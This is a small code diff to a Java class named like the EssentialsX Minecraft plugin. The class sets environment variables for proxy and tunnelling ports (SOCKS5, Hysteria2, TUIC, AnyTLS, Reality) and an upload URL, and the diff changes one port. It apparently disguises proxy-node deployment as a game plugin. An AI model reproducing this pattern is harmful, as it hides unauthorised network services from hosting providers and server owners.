@@ -84,7 +84,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "27077");
         env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "32057");
+        env.put("ANYTLS_PORT", "2022");
         env.put("REALITY_PORT", "29173");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
